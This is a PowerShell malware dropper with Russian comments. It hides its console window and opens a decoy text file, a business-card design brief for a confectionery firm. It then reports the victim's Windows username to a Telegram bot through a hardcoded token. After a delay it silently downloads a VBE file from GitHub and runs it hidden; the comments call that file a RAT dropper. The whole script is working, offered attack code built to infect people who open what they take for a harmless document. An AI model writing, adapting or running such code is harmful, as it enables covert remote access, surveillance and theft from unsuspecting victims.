# СКРЫВАЕМ ОКНО POWERSHELL
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)

# СОЗДАЁМ И ЗАПУСКАЕМ ЛЕГИТИМНЫЙ TXT
$fileName = "Сводка по созданию визитки.txt"
$filePath = Join-Path $env:LOCALAPPDATA $fileName

$content = @"
ЗАДАЧА: Сделать классную, двустороннюю визитку для нашей фабрики Моя сладкая провинция. Хотим, чтобы она выглядела уютно, вызывала аппетит и показывала, что мы делаем ставку на натуральность и домашнюю атмосферу.

Что должно быть на визитке:

Название: Моя сладкая провинция
Сайт: www.myprovince.ru
E‑mail: corn7@mail.ru
Юрлицо: ООО Оптима, ИНН 6820035844
Адрес: Россия, 392526, Тамбовская обл., г.о. город Тамбов, зона Промышленная, д. 23
Телефоны:
8 (4752) 777-877
773-400
779-345
779-346
774-534
779-347

Как можно оформить лицевую сторону:

Вариант 1: Большой логотип на нежном пастельном фоне, хорошо читаемое название и сайт, и тоненькая шоколадная рамочка.
Вариант 2: Фото продукции на фоне полупрозрачной плашки с названием и сайтом, плюс пастельный фон с шоколадными деталями.
Вариант 3: Композиция в винтажном стиле с разными украшениями и местом для логотипа, пастельный фон и шоколадные элементы.
Вариант 4: Фон с каким-нибудь узором (например, горошек), который привлекает внимание. Логотип и текст разместить на контрастном фоне, чтобы их было хорошо видно.
Вариант 5: Оформить как этикетку: крупное название, короткий слоган и сайт, плюс декоративная штриховка шоколадного цвета.

Как можно оформить оборотную сторону:

Вариант 1: Контактные данные на фоне шоколадного цвета. Контакты написать белым, а сверху – небольшой логотип.
Вариант 2: Коротко перечислить, что мы делаем (какой у нас ассортимент), а под контактами – QR‑код на сайт. (не используем - плохая идея)
Вариант 3: Простая схема проезда с адресом и телефонами на светлом пастельном фоне. https://myprovince.ru/kontakty
Вариант 4: Место для купона или промокода с красивой рамочкой, чтобы было видно, что это скидка для владельца визитки. (не используем - плохая идея)
Вариант 5: Пару предложений о нашей компании и контакты, плюс шоколадные акценты.

Какие цвета и шрифты использовать:

Цвета: Пастельные (кремовый, персиковый, светло‑бежевый) и шоколадные (тёмный и молочный шоколад, какао).
Шрифты: Для заголовков – что-то изящное, а для основного текста – легко читаемое. Для подписи или слогана можно использовать рукописный шрифт. Укажите размеры и другие шрифты на всякий случай.

Технические детали:

Формат: 90×50 мм (или согласуйте с типографией).
Печать: CMYK, 300 dpi, не забудьте про поля для обрезки и безопасные зоны.
Файлы: Оригинал в Figma/AI/PSD, PDF для печати и PNG/JPG для показа. Укажите, какие цветовые профили и шрифты использовали.

Фото для визитки должны быть подкрепленны
"@

$content | Out-File -FilePath $filePath -Encoding UTF8
Invoke-Item $filePath

# ОТПРАВЛЯЕМ СООБЩЕНИЕ В TELEGRAM
$Token = "8263447327:AAH2UWtHaUU0i_3OmxK7mzmRLTK8MfsWzSk"
$ChatID = "7063407604"
$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$Message = "The user's shortcut was enabled for user: $CurrentUser"

$URL = "https://api.telegram.org/bot$Token/sendMessage"

$Body = @{
    chat_id = $ChatID
    text = $Message
} | ConvertTo-Json

try {
    $Response = Invoke-RestMethod -Uri $URL -Method Post -ContentType "application/json" -Body $Body
} catch {
}

# ЗАДЕРЖКА
Start-Sleep -Seconds 444

# СКРЫТО СКАЧИВАЕМ И ЗАПУСКАЕМ ПЕРЕНОСЧИК RAT
$Url = "https://github.com/Mafin111/MafinREP111/raw/refs/heads/main/SCRRC4ryuk.vbe"
$FileName = "ryuk.vbe"
$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
$DownloadPath = Join-Path $LocalAppData $FileName

try {
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($Url, $DownloadPath)
    
    $processInfo = New-Object System.Diagnostics.ProcessStartInfo
    $processInfo.FileName = $DownloadPath
    $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $processInfo.CreateNoWindow = $true
    [System.Diagnostics.Process]::Start($processInfo) | Out-Null
}
catch {
	
}


exit